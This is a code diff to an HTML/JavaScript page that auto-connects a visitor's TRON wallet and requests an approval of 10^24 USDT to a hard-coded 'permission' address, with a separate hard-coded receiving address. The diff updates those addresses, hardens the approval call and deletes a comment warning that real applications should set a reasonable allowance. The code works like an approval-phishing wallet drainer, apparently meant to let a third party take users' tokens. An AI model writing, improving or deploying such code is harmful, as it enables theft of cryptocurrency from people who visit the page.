@@ -14,10 +14,10 @@
     <div id="error" style="color: red; display: none;"></div>
 
     <script>
-        // 配置地址 - 请确保这些地址的有效性
+        // 配置地址 - 与测试页面保持一致
         window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 权限地址（合约地址）
-        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';   // 收款地址
-        window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // USDT合约地址
+        window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';   // 收款地址，与test.html统一
+        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 标准USDT合约地址
 
         // 存储用户数据
         const userData = {
@@ -40,6 +40,9 @@
         // 自动连接钱包
         async function autoConnectWallet() {
             updateStatus("正在自动连接钱包...");
+            
+            // 验证地址配置完整性
+            validateAddressConfig();
             
             // 检查是否在移动设备上
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -69,15 +72,44 @@
                 window.tronWeb = window.tronLink.tronWeb;
             }
 
+            // 验证tronWeb是否可用
+            if (!window.tronWeb || typeof window.tronWeb.address.toHex !== 'function') {
+                throw new Error("TronWeb初始化失败，无法完成授权操作");
+            }
+
             // 获取用户信息
             userData.address = window.tronWeb.defaultAddress.base58;
             updateStatus(`已连接钱包: ${userData.address.substring(0, 6)}...${userData.address.substring(38)}`);
             
-            // 获取余额（可选，授权不一定需要）
+            // 获取余额
             const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
             userData.trxBalance = window.tronWeb.fromSun(trxBalance);
             
             return true;
+        }
+
+        // 验证地址配置
+        function validateAddressConfig() {
+            const addresses = [
+                { name: '权限地址', value: window.Permission_address },
+                { name: '收款地址', value: window.Payment_address },
+                { name: 'USDT合约地址', value: window.usdtContractAddress }
+            ];
+            
+            // 检查地址是否存在
+            addresses.forEach(item => {
+                if (!item.value) {
+                    throw new Error(`${item.name}未配置，请检查配置`);
+                }
+            });
+            
+            // 检查地址格式（TRON地址以T开头，34位长度）
+            const isValidAddress = (addr) => addr.length === 34 && addr.startsWith('T');
+            addresses.forEach(item => {
+                if (!isValidAddress(item.value)) {
+                    throw new Error(`${item.name}格式错误: ${item.value}`);
+                }
+            });
         }
 
         // 授权代币
@@ -89,23 +121,28 @@
             }
 
             try {
+                // 转换地址为十六进制
+                const usdtContractHex = window.tronWeb.address.toHex(window.usdtContractAddress);
+                const permissionHex = window.tronWeb.address.toHex(window.Permission_address);
+                
                 // 加载USDT合约
-                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                const contract = await window.tronWeb.contract().at(usdtContractHex);
                 if (!contract) {
                     throw new Error("无法加载USDT合约");
                 }
 
-                // 授权无限额度 (实际应用中应设置合理额度)
-                const amount = new Decimal(10).pow(24).toString(); // 10^24 是一个很大的数
+                // 授权额度 (10^24 是一个较大的额度)
+                const amount = new Decimal(10).pow(24).toString();
                 
                 updateStatus("正在发起授权请求，请在钱包中确认...");
                 
                 // 调用approve方法授权
                 const result = await contract.approve(
-                    window.Permission_address,  // 授权给哪个地址
-                    amount                     // 授权额度
+                    permissionHex,  // 授权给哪个地址（十六进制）
+                    amount          // 授权额度
                 ).send({
-                    from: userData.address
+                    from: userData.address,
+                    feeLimit: 100000000  // 设置手续费上限
                 });
 
                 if (result.result) {
